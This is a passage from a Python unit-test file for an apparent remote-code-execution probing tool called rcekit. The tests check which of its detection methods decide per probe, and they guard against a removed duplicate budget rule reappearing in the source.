        per_probe = {name for name, cls in rcekit.DETECTION_METHODS.items()
                     if cls.decides_per_probe()}
        self.assertEqual(per_probe, {"deser", "lookup", "oob"})
        for name in ("time", "boolean"):
            with self.subTest(method=name):
                self.assertFalse(rcekit.DETECTION_METHODS[name].decides_per_probe())

    def test_one_rule_decides_a_budget_for_a_whole_series_method(self):
        """There were two: a floor checked before the first wave, and the wave
        check itself. They agreed on every outcome, so the floor was dead
        weight -- and it was the path that still dropped an abandoned
        measurement without a row, because the fix had gone into the other one.
        Two paths for one decision is how that happens."""
        source = (REPO_ROOT / "rcekit.py").read_text(encoding="utf-8")
        self.assertNotIn("min_series_probes", source,
                         "a second budget rule is back; one of the two will drift")
        self.assertEqual(source.count("abandoned = ("), 1,
                         "a series is abandoned from more than one place")
